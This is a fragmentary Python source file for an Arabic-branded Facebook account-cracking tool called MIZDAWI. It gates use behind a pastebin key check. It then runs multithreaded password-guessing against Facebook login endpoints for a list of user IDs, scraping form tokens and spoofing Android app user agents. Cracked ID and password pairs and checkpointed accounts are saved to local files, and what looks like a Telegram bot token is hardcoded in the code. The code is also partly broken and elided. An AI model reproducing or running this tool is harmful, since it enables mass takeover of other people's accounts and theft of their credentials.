...
key = "|".join(uuid)
link = requests.get("https://pastebin.com/a8j2cyzE").text
if key in link:
   pass
else:
   print("Your key",key)
   os.system("نورت اداه المزداوي يحب 😛🔥")
   sys.exit()
from os import path
...
def clear():
        os.system('clear')
print('\033[1;37m[+] \033[1;32mاستعد لصيد من مزداوي ⬆️🔞...')
try:
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠟⣿⣿⣿⣿⣿⣼⠳⣍⣷⣿⣿⣷⣻⣿⣿⣿⣿⣿⣿⡿⣡⠳⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'\x1b[1;32m[\33[1;97m=\33[1;91m] \33[1;92mTOOL NAME\033[1;97m ●   \33[1;92m𝐌𝐈𝐙𝐃𝐀𝐖𝐈🏴‍☠️🔥    
'\x1b[1;32m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92m𝐌𝐈𝐙𝐃𝐀𝐖𝐈🏴‍☠️🔥    
'\x1b[1;32m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92m𝐌𝐈𝐙𝐃𝐀𝐖𝐈🏴‍☠️🔥
'\x1b[1;32m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m2.0 V
'\x1b[1;32m[\33[1;97m=\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;92mاداه ملف يحبي 🔥
'\x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\x1b[1;32m-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
...
def menu():
        try:
                clear()
                os.system('https://t.me/mizdawivip')
                if 1==1:
                        clear()
                        print('\033[1;37m[1] صيد من ملف 👽\n\033[1;37m[2] قنات المطور المزداوي 🔥 \n\033[1;37m[0] خروج من الاداه 💔')
                        linex()
                        xd=input('\033[1;37m[?] اختار : ')
                        if xd in ['1','01']:
                                os.system('https://t.me/mizdawivip');clear()
                                file = input('\033[1;37m ➜ ادخل مسار الملف: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\033[1;32m[1] مايثود \n[2] مايثود ')
                                linex()
                                mthd=input('\033[1;32m[?] Choose : ')
                                linex()
                                plist = []
                                print('\033[1;37m           Select Password Crack menu');linex();print('باسوردات خاصه ب الاداه 😘🔥');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' عدد ايديات الملف : \033[1;32m'+total_ids)
                                        linex()
                                        linex()
                                        for user in fo:
                                ...
                                os.system(' xdg-open https://t.me/mizdawivip');menu()
                        elif xd in ['3','03']:
                                exit('DEVIL+') 
                        elif xd in ['4','04']:
                                clear()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        getlog = session.get(f'https://www.facebook.com/profile.php?id=100089147156284')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] %s | %s'%(ids,pas))
                                open('/sdcard/𝐌𝐈𝐙𝐃𝐀𝐖𝐈-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐌𝐈𝐙𝐃𝐀𝐖𝐈-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ا𝐌𝐈𝐙𝐃𝐀𝐖𝐈] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for pw in passlist:
                        ...
                        accessToken = '7049180419:AAER22i0RRM_M1paGrT1fIK4Z60U_ngoDng'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐌𝐈𝐙𝐃𝐀𝐖𝐈-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐌𝐈𝐙𝐃𝐀𝐖𝐈] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        accessToken = 'https://t.me/mizdawivip'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DEVIL-𝐌𝐈𝐙𝐃𝐀𝐖𝐈-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [𝐌𝐈𝐙𝐃𝐀𝐖𝐈] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐌𝐈𝐙𝐃𝐀𝐖𝐈-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
